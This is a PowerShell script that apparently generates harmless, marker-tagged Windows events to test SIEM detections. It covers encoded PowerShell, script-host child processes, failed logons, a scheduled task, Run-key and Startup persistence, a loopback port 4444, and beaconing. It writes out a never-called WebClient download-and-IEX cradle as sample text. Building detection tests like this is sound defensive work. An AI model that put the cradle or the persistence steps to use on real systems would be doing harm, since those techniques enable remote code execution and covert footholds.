# Generates harmless events for each detection, carrying a random marker. Nothing downloads or runs
# code from the network: the risky script text sits in a function that is never called. Everything
# created here is removed. Writes the marker to -Out. Needs no elevation.
param([Parameter(Mandatory)] [string] $Out, [switch] $Beacon)
$ErrorActionPreference = 'Continue'
$Marker = 'SIEMDET' + [guid]::NewGuid().ToString('N').Substring(0, 10)
@{ marker = $Marker; started = (Get-Date).ToUniversalTime().ToString('o') } | ConvertTo-Json | Set-Content -LiteralPath $Out -Encoding ASCII
$Temp = Join-Path $env:TEMP $Marker
New-Item -ItemType Directory -Force $Temp | Out-Null

function Quietly([string] $File, [string] $Arguments) {
  $Info = New-Object Diagnostics.ProcessStartInfo
  $Info.FileName = $File
  $Info.Arguments = $Arguments
  $Info.UseShellExecute = $false
  $Info.CreateNoWindow = $true
  $Info.RedirectStandardError = $true
  $Info.RedirectStandardOutput = $true
  $Process = [Diagnostics.Process]::Start($Info)
  $Process.WaitForExit(15000) | Out-Null
}
$Shell = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

# 1. Suspicious PowerShell. Script block logging records the text. The function is never called.
$Script = Join-Path $Temp 'block.ps1'
"# $Marker`r`nfunction NeverCalled { `$c = New-Object Net.WebClient; IEX (`$c.DownloadString('http://127.0.0.1:9/none')) }`r`nGet-Date | Out-Null" | Set-Content -LiteralPath $Script -Encoding ASCII
Quietly $Shell "-NoProfile -ExecutionPolicy Bypass -File `"$Script`""

# 2. Encoded PowerShell, with and without risky decoded content.
$Plain = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("# $Marker`nGet-Date | Out-Null"))
Quietly $Shell "-NoProfile -enc $Plain"
$Risky = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("# $Marker`nfunction NeverCalled { iex 'Get-Date' }"))
Quietly $Shell "-NoProfile -enc $Risky"

# 3. Parent and child: a script host starts a shell.
$Vbs = Join-Path $Temp 'child.vbs'
"CreateObject(`"WScript.Shell`").Run `"cmd.exe /c rem $Marker`", 0, True" | Set-Content -LiteralPath $Vbs -Encoding ASCII
Quietly "$env:SystemRoot\System32\cscript.exe" "//nologo `"$Vbs`""

# 4. Failed logons for accounts that do not exist, so no real account can lock out.
foreach ($Index in 1..6) { Quietly "$env:SystemRoot\System32\net.exe" "use \\localhost\IPC$ /user:${Marker}a notthepassword$Index" }
foreach ($Name in 'b', 'c', 'd', 'e') { Quietly "$env:SystemRoot\System32\net.exe" "use \\localhost\IPC$ /user:$Marker$Name notthepassword" }

# 5. Privilege discovery. The marker is a harmless extra argument, which whoami rejects after it logs.
Quietly "$env:SystemRoot\System32\whoami.exe" "/priv /nh $Marker"

# 7. Scheduled task: registered, and created from the command line.
Quietly "$env:SystemRoot\System32\schtasks.exe" "/create /tn $Marker /tr `"cmd.exe /c rem $Marker`" /sc once /st 23:59 /f"
Start-Sleep -Seconds 2
Quietly "$env:SystemRoot\System32\schtasks.exe" "/delete /tn $Marker /f"

# 8. Persistence: an autorun value and a Startup file, both removed at once. Neither ever runs.
$Run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
New-ItemProperty -Path $Run -Name $Marker -Value "cmd.exe /c rem $Marker" -PropertyType String -Force | Out-Null
Start-Sleep -Seconds 1
Remove-ItemProperty -Path $Run -Name $Marker
$Startup = Join-Path ([Environment]::GetFolderPath('Startup')) "$Marker.bat"
"rem $Marker" | Set-Content -LiteralPath $Startup -Encoding ASCII
Start-Sleep -Seconds 1
Remove-Item -LiteralPath $Startup

# 10. Network: a script host reaching a public address, and a shell port on loopback.
$Client = New-Object Net.Sockets.TcpClient
try { $Client.ConnectAsync('example.com', 443).Wait(4000) | Out-Null } catch { } finally { $Client.Close() }
$Listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Loopback, 4444)
try {
  $Listener.Start()
  $Client = New-Object Net.Sockets.TcpClient
  $Client.Connect('127.0.0.1', 4444)
  $Client.Close()
} catch { Write-Output "port 4444 test skipped: $($_.Exception.Message)" } finally { $Listener.Stop() }

if ($Beacon) {
  foreach ($Index in 1..7) {
    $Client = New-Object Net.Sockets.TcpClient
    try { $Client.ConnectAsync('example.com', 80).Wait(3000) | Out-Null } catch { } finally { $Client.Close() }
    Start-Sleep -Seconds 12
  }
}
Remove-Item -LiteralPath $Temp -Recurse -Force -ErrorAction SilentlyContinue
Write-Output 'generated'
